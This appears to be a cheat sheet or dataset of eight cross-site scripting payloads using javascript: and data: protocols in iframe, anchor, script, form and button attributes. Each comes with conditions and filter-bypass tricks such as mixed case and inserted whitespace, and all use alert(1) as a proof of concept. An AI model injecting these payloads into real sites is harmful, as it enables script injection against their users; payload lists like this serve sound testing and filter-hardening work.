1. XSS with Iframe src JavaScript Protocol
- Payload: <iframe src="javascript:alert(1)">
- Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded and the input is in an iframe src attribute or can create one
- Case: Use the javascript: protocol in an iframe src attribute to execute JavaScript
- Output: <iframe src="javascript:alert(1)">

---

2. XSS with Anchor href JavaScript Protocol
- Payload: <a href="javascript:alert(1)">XSS</a>
- Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded and the input is in an anchor href attribute or can create one
- Case: Use the javascript: protocol in a link href attribute. Requires user click to execute
- Output: <a href="javascript:alert(1)">XSS</a>

---

3. XSS with JavaScript Protocol Case Insensitive
- Payload: <a href="JaVaScript:alert(1)">XSS</a>
- Condition: Input is reflected into HTML where the filter blocks "javascript:" but is case-sensitive
- Case: The protocol is not case sensitive, so mix upper and lower case to bypass case-sensitive filters
- Output: <a href="JaVaScript:alert(1)">XSS</a>

---

4. XSS with JavaScript Protocol with Whitespace Before
- Payload: <a href=" javascript:alert(1)">XSS</a>
- Condition: Input is reflected into HTML where the filter blocks "javascript:" at the start of the string
- Case: Characters \x01-\x20 are allowed before the protocol, so prepend whitespace to bypass filters that only check the start
- Output: <a href=" javascript:alert(1)">XSS</a>

---

5. XSS with JavaScript Protocol with Tab/Newline Inside
- Payload: <a href="javas cript:alert(1)">XSS</a>
- Condition: Input is reflected into HTML where the filter blocks "javascript:" as a continuous string
- Case: Characters \x09 (tab), \x0a (newline), \x0d (carriage return) are allowed inside the protocol name, so insert them to break up the keyword
- Output: <a href="javas cript:alert(1)">XSS</a>

---

6. XSS with Data Protocol in Script src
- Payload: <script src="data:text/javascript,alert(1)"></script>
- Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded
- Case: Use the data: protocol with text/javascript MIME type to execute JavaScript from a script src attribute
- Output: <script src="data:text/javascript,alert(1)"></script>

---

7. XSS with Form Action JavaScript Protocol
- Payload: <form action=javascript:alert(1)><input type=submit value=XSS>
- Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded
- Case: Use the javascript: protocol in a form action attribute. Requires user submit to execute
- Output: <form action=javascript:alert(1)><input type=submit value=XSS>

---

8. XSS with Button Formaction JavaScript Protocol
- Payload: <form><button formaction=javascript:alert(1)>XSS
- Condition: Input is reflected into HTML where angle brackets (< >) are NOT encoded
- Case: Use the javascript: protocol in a button formaction attribute. Requires user click to execute
- Output: <form><button formaction=javascript:alert(1)>XSS
